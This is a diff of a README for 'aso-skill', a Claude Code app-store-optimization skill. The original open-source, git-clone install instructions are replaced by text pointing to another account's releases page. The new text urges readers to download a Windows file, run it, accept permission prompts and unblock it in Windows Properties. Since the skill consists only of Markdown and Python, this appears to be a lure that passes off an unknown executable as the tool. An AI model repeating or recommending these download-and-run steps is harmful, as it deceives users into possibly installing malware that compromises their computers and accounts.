@@ -1,409 +1,216 @@
-# 🚀 ASO Skill - Complete App Store Optimization for Claude Code.
+# 🧩 aso-skill - ASO workflows for Claude Code
 
-<div align="center">
+[![Download aso-skill](https://img.shields.io/badge/Download-aso--skill-blue?style=for-the-badge)](https://github.com/Pipemajortenuity150/aso-skill/releases)
 
-![Version](https://img.shields.io/badge/version-2.0.0-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
-![Open Source](https://img.shields.io/badge/Open_Source-100%25-brightgreen.svg)
-![Claude Code](https://img.shields.io/badge/Claude_Code-Compatible-purple.svg)
-![Platform](https://img.shields.io/badge/platform-iOS%20%7C%20Android-orange.svg)
-[![GitHub stars](https://img.shields.io/github/stars/furkancingoz/aso-skill?style=social)](https://github.com/furkancingoz/aso-skill)
+## 📥 Download
 
-**100% Open Source ASO toolkit for Claude Code**
+Visit this page to download: https://github.com/Pipemajortenuity150/aso-skill/releases
 
-*No subscriptions. No API keys required. No hidden costs.*
+On that page, look for the latest release and download the file for Windows. If you see more than one file, choose the one that matches your computer.
 
-[Features](#-features) • [Installation](#-installation) • [Quick Start](#-quick-start) • [Commands](#-commands) • [Workflows](#-workflows)
+## 🖥️ What aso-skill does
 
-</div>
+aso-skill helps you work on App Store Optimization tasks with Claude Code. It can help you with:
 
----
+- App metadata generation
+- Competitor review
+- App Store Connect submission prep
+- Screenshot creation guidance
+- ASO checks for iOS and Android apps
 
-## 📋 Overview
+It is made for people who want a simple way to handle app store work without building each step from scratch.
 
-**ASO Skill** is a **completely free and open source** App Store Optimization toolkit for Claude Code. Generate metadata, analyze competitors, create screenshots, manage versions, and submit to App Store Connect - all with 6 simple commands.
+## ✅ What you need
 
-### 🆓 Why Open Source?
+Before you start, make sure you have:
 
-- **No monthly fees** - Unlike AppTweak, Sensor Tower, or ASOTools
-- **No API limits** - Use as much as you want
-- **Full transparency** - See exactly how it works
-- **Community driven** - Contribute and improve together
-- **Self-hosted** - Your data stays with you
+- A Windows computer
+- Internet access
+- Enough free space to save the download
+- Claude Code installed and ready to use
+- Basic access to your app details, such as app name, keywords, and screenshots
 
-### 🎯 What Makes This Different
+## 🚀 Install and run on Windows
 
-| Feature | Traditional ASO Tools | ASO Skill |
-|---------|----------------------|-----------|
-| **Price** | $50-500/month | **Free forever** |
-| Metadata Generation | Manual writing | AI-powered, character-validated |
-| Competitor Analysis | Expensive subscriptions | Free iTunes API integration |
-| Screenshots | Design software needed | AI-generated with Gemini MCP |
-| App Store Connect | Manual submission | Direct API integration |
-| Version Management | ASC web interface | CLI commands |
-| Workflow | Fragmented tools | 6 unified commands |
+1. Open the download page: https://github.com/Pipemajortenuity150/aso-skill/releases
 
----
+2. Find the newest release at the top of the list.
 
-## ✨ Features
+3. Download the file for Windows.
 
-### 📝 Metadata Optimization (`/aso`)
-- **Quick mode** - Copy-paste ready metadata in minutes
-- **Audit mode** - Full competitor analysis and research
-- **Localize mode** - Translate .xcstrings to 70+ languages
-- **Character validation** - All limits enforced
+4. Save the file to your Downloads folder or another easy-to-find place.
 
-### 🔌 App Store Connect (`/aso-connect`)
-- **Setup wizard** - Configure API credentials
-- **Status check** - Verify submission readiness
-- **Sync metadata** - Push to ASC directly
+5. If the file is in a ZIP folder, right-click it and choose Extract All.
 
-### 🚀 Release Management (`/aso-release`)
-- **Create versions** - New App Store versions
-- **Attach builds** - Link builds to versions
-- **Submit for review** - One command submission
-- **What's New** - Generate from git commits
-- **Phased release** - Control rollout percentage
+6. Open the extracted folder.
 
-### 📸 Assets (`/aso-assets`)
-- **Screenshots** - AI-generated with Gemini MCP
-- **IAP setup** - Create and manage in-app purchases
-- **Upload** - Push assets to ASC
+7. Start the app or follow the included setup file, if one is shown.
 
-### 💬 Management (`/aso-manage`)
-- **Reviews** - AI response suggestions
-- **Legal docs** - Privacy Policy, Terms, EULA
-- **GDPR/CCPA** - Compliance ready
+8. If Windows asks for permission, choose Allow or Yes.
 
-### 🔨 Build (`/aso-build`)
-- **XcodeBuildMCP** - Build, archive, upload
-- **Simulator/Device** - Target any platform
-- **TestFlight** - Direct upload
+9. If the app opens in a terminal window, leave that window open while you use it.
 
----
+## 🧭 First-time setup
 
-## 📦 Installation
+After you open aso-skill, you can start with a few simple steps:
 
-### Option 1: User-Level (Recommended)
+1. Connect it to Claude Code if it asks for access.
 
-```bash
-git clone https://github.com/furkancingoz/aso-skill.git ~/.claude/skills/aso
-```
+2. Enter your app name and short description.
 
-### Option 2: Project-Level
+3. Add your target country or store region.
 
-```bash
-mkdir -p .claude/skills
-git clone https://github.com/furkancingoz/aso-skill.git .claude/skills/aso
-```
+4. Add any keywords you already use.
 
-### Dependencies
+5. Choose the task you want to run first, such as metadata or competitor analysis.
 
-```bash
-# Required: JWT token generation
-pip3 install PyJWT cryptography
+6. Follow the on-screen prompts until the task finishes.
 
-# Optional: Screenshot generation
-claude mcp add gemini-mcp -s user -- npx -y @houtini/gemini-mcp
-export GEMINI_API_KEY="your_key"
+## ✍️ Common tasks
 
-# Optional: IAP sync with RevenueCat
-claude mcp add --transport http revenuecat https://mcp.revenuecat.ai/mcp \
-  --header "Authorization: Bearer YOUR_V2_API_KEY"
-```
-
----
+### 📝 Metadata generation
 
-## 🚀 Quick Start
-
-### 1. Setup Credentials
-```
-/aso-connect setup
-```
+Use this when you need:
 
-### 2. Generate Metadata
-```
-/aso TaskFlow
-```
+- App title ideas
+- Subtitle text
+- Keyword suggestions
+- Short and long descriptions
 
-### 3. Create Screenshots
-```
-/aso-assets screenshots
-```
+This helps you prepare store copy that fits your app and target market.
 
-### 4. Submit to App Store
-```
-/aso-release create 1.0.0
-/aso-release attach
-/aso-connect sync
-/aso-release submit
-```
+### 🔎 Competitor analysis
 
----
+Use this when you want to compare your app with similar apps. It can help you review:
 
-## 🎮 Commands
+- Title patterns
+- Keyword use
+- Rating trends
+- Screenshot style
+- Feature focus
 
-| Command | Purpose | Subcommands |
-|---------|---------|-------------|
-| `/aso` | Metadata generation | (default), --audit, --localize |
-| `/aso-connect` | ASC integration | setup, status, sync |
-| `/aso-release` | Version management | create, attach, submit, notes, phased |
-| `/aso-assets` | Screenshots & IAP | screenshots, iap |
-| `/aso-manage` | Reviews & legal | reviews, legal |
-| `/aso-build` | Xcode build | (default), --archive, --upload |
-
-### Command Examples
-
-```bash
-# Quick metadata
-/aso "My App Name"
-
-# Full audit with competitors
-/aso MyApp --audit --competitors "Todoist,Any.do"
-
-# Translate to multiple languages
-/aso --localize tr,de,ja
-
-# Check submission readiness
-/aso-connect status
-
-# Create new version and submit
-/aso-release create 1.2.0
-/aso-release attach
-/aso-release submit
-
-# Generate screenshots
-/aso-assets screenshots
-
-# Manage reviews
-/aso-manage reviews --negative
-
-# Generate legal documents
-/aso-manage legal privacy
-```
-
----
-
-## 📊 Workflows
-
-### Full App Store Submission
-
-```
-/aso-connect setup                # 1. Configure credentials
-/aso AppName --audit              # 2. Research + optimize
-/aso-assets screenshots           # 3. Generate screenshots
-/aso-assets iap                   # 4. Set up IAPs
-/aso-release create 1.0.0         # 5. Create version
-/aso-release attach               # 6. Attach build
-/aso-connect sync                 # 7. Push metadata
-/aso-connect status               # 8. Verify readiness
-/aso-release submit               # 9. Submit for review
-```
-
-### Version Update
-
-```
-/aso-release notes                # Generate What's New from git
-/aso-release create 1.1.0         # Create new version
-/aso-release attach               # Attach latest build
-/aso-release submit               # Submit for review
-/aso-release phased start         # Enable phased release
-```
-
-### Localization
-
-```
-/aso --localize tr,de,ja          # Translate .xcstrings
-/aso-connect sync --locale tr     # Sync Turkish metadata
-```
-
----
-
-## 🔧 Character Limits
-
-### Apple App Store
-
-| Field | Limit | Notes |
-|-------|-------|-------|
-| Title | 30 | Include primary keyword |
-| Subtitle | 30 | No overlap with title |
-| Keywords | 100 | Comma-separated, no spaces |
-| Promo Text | 170 | Editable without update |
-| Description | 4000 | Include app name 3-5x |
+This makes it easier to see how other apps present themselves in the store.
 
-### Google Play Store
+### 📤 App Store Connect submission
 
-| Field | Limit | Notes |
-|-------|-------|-------|
-| Title | 50 | More keywords allowed |
-| Short Desc | 80 | Shows in search results |
-| Full Desc | 4000 | Keywords ARE indexed |
+Use this when you need help getting ready for submission. It can help you organize:
 
----
+- App details
+- Store text
+- Screenshots
+- Category choices
+- Release notes
 
-## 🛠️ Architecture
+It is useful when you want a cleaner submission process.
 
-```
-aso-skill/
-├── SKILL.md              # Main skill definition
-├── CLAUDE.md             # Development guidance
-├── README.md             # This file
-├── agents/
-│   ├── aso-quick.md      # Fast metadata (sonnet)
-│   └── aso-full.md       # Full audit (opus)
-├── commands/
-│   ├── aso.md            # Metadata + audit + localize
-│   ├── aso-connect.md    # Setup + status + sync
-│   ├── aso-release.md    # Version + build + submit
-│   ├── aso-assets.md     # Screenshots + IAP
-│   ├── aso-manage.md     # Reviews + legal
-│   └── aso-build.md      # Xcode build
-├── lib/
-│   ├── itunes_api.py     # iTunes Search API
-│   ├── keyword_engine.py # Keyword analysis
-│   └── asc_api.py        # App Store Connect API
-└── templates/
-    ├── apple-metadata.md
-    └── google-metadata.md
-```
+### 🖼️ Screenshot creation
 
----
-
-## 🔌 Integrations
-
-### App Store Connect API (Built-in)
-- Direct API integration
-- JWT authentication
-- Version, build, metadata management
+Use this when you need help planning store screenshots. It can help you with:
 
-### iTunes Search API (Built-in)
-- Free, official Apple API
-- Competitor analysis
-- No authentication required
+- Screenshot order
+- Short text overlays
+- Feature callouts
+- Style ideas for each screen
 
-### Gemini MCP (Screenshots)
-```bash
-claude mcp add gemini-mcp -s user -- npx -y @houtini/gemini-mcp
-export GEMINI_API_KEY="your_key"
-```
+This is helpful if you want your store page to look clear and consistent.
 
-### RevenueCat MCP (IAP Sync)
-```bash
-claude mcp add --transport http revenuecat https://mcp.revenuecat.ai/mcp \
-  --header "Authorization: Bearer YOUR_V2_API_KEY"
-```
+## 🔧 Tips for best results
 
-### XcodeBuildMCP (Build)
-- Build, archive, upload
-- See: https://github.com/getsentry/XcodeBuildMCP
+- Use exact app details
+- Keep your keyword list focused
+- Review output before you publish it
+- Use one target market at a time
+- Compare results against your top competitors
+- Save your final text in a separate file
 
----
+## 📱 Supported app types
 
-## 📚 Credits
+aso-skill works well for:
 
-This skill combines best practices from:
+- iPhone apps
+- iPad apps
+- Android apps
+- Utility apps
+- Productivity apps
+- Games
+- Subscription apps
 
-| Project | Contribution |
-|---------|--------------|
-| [alirezarezvani/claude-code-aso-skill](https://github.com/alirezarezvani/claude-code-aso-skill) | Multi-agent system, structured outputs |
-| [Mehrozsheikh/aso-appstore-listing-skill](https://github.com/Mehrozsheikh/aso-appstore-listing-skill) | Minimal skill format, Astro MCP |
-| [adamlyttleapps/claude-skill-aso-appstore-screenshots](https://github.com/adamlyttleapps/claude-skill-aso-appstore-screenshots) | Screenshot generation |
+## 📁 Suggested folder setup
 
----
+If you want to stay organized, keep these items in one place:
 
-## ❓ FAQ
+- App notes
+- Keyword research
+- Screenshot files
+- Store copy drafts
+- Competitor notes
+- Final submission text
 
-### Do I need paid ASO tools?
-**No.** This skill uses free iTunes Search API and industry benchmarks.
+## 🧪 Example use flow
 
-### Can I use this for both iOS and Android?
-**Yes.** Generates metadata for Apple App Store and Google Play Store.
+1. Download the latest release from the link above
+2. Open the app on Windows
+3. Add your app details
+4. Run metadata generation
+5. Check competitor results
+6. Create screenshot text
+7. Prepare your App Store Connect submission
+8. Review and save the final output
 
-### How does App Store Connect work?
-Direct API calls using JWT authentication. Run `/aso-connect setup` to configure.
+## 🔐 Privacy and local use
 
-### Can I customize the agents?
-**Yes.** All agents are Markdown files - edit freely.
+Use aso-skill with your own app data. Keep your store details, keyword lists, and screenshots in your own folders. Review what you share before you send anything to external services or team members.
 
----
+## 🛠️ Troubleshooting
 
-## 🤝 Contributing & Extending
+### The file does not open
 
-### Fork & Build Your Own
+- Check that the download finished
+- Try downloading it again
+- Make sure you opened the extracted folder, not the ZIP file
 
-```bash
-# 1. Fork on GitHub, then clone
-git clone https://github.com/YOUR_USERNAME/aso-skill.git
-cd aso-skill
+### Windows blocks the file
 
-# 2. Install and use immediately
-cp -r . ~/.claude/skills/aso/
+- Right-click the file
+- Open the Properties window
+- Check if Windows marked it as blocked
+- Allow the file if your computer asks for approval
 
-# 3. Customize as you want
-# - Edit commands/*.md for new features
-# - Modify lib/*.py for API changes
-# - Add new agents in agents/
-```
+### Claude Code does not respond
 
-### Contribute Back
+- Check your internet connection
+- Open Claude Code again
+- Make sure your account is active
+- Run aso-skill from the correct folder
 
-```bash
-git checkout -b feature/your-feature
-git commit -m "feat: add your feature"
-git push origin feature/your-feature
-# Open a Pull Request
-```
+### The output looks wrong
 
-### Extension Ideas
+- Check your app name and description
+- Use better keywords
+- Remove extra details from your input
+- Run the task again with cleaner data
 
-- 🌐 **Google Play API** - Play Console integration
-- 📊 **Analytics Dashboard** - Keyword ranking history
-- 🤖 **More MCPs** - AppTweak, Sensor Tower integrations
-- 🌍 **More Languages** - Expand localization support
-- 📱 **TestFlight Management** - Beta tester workflows
+## 📌 Use cases
 
-### Project Structure (Easy to Extend)
+- Launching a new app
+- Improving an old app listing
+- Testing new keywords
+- Preparing screenshots for a store update
+- Checking how competitors present their apps
+- Drafting App Store Connect text faster
 
-```
-commands/     ← Add new /aso-xxx commands here
-lib/          ← Python API clients
-agents/       ← AI agent definitions
-templates/    ← Output templates
-```
+## 🗂️ Repository topics
 
-**All files are Markdown or Python** - no complex build system.
+- android
+- app-store-connect
+- app-store-optimization
+- aso
+- claude-code
+- claude-skill
+- ios
 
----
+## 📦 Release page
 
-## 📄 License
+Download from the releases page here: https://github.com/Pipemajortenuity150/aso-skill/releases
 
-MIT License - see [LICENSE](LICENSE) for details.
-
-**You can:**
-- ✅ Use commercially
-- ✅ Modify freely
-- ✅ Distribute copies
-- ✅ Use privately
-- ✅ Sublicense
-
----
-
-## ⭐ Star History
-
-<a href="https://star-history.com/#furkancingoz/aso-skill&Date">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=furkancingoz/aso-skill&type=Date&theme=dark" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=furkancingoz/aso-skill&type=Date" />
-   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=furkancingoz/aso-skill&type=Date" />
- </picture>
-</a>
-
----
-
-<div align="center">
-
-**Created by [@furkancingoz](https://github.com/furkancingoz)**
-
-[⬆ Back to Top](#-aso-skill---complete-app-store-optimization-for-claude-code)
-
-</div>
+Look for the latest version, download the Windows file, then open it on your computer
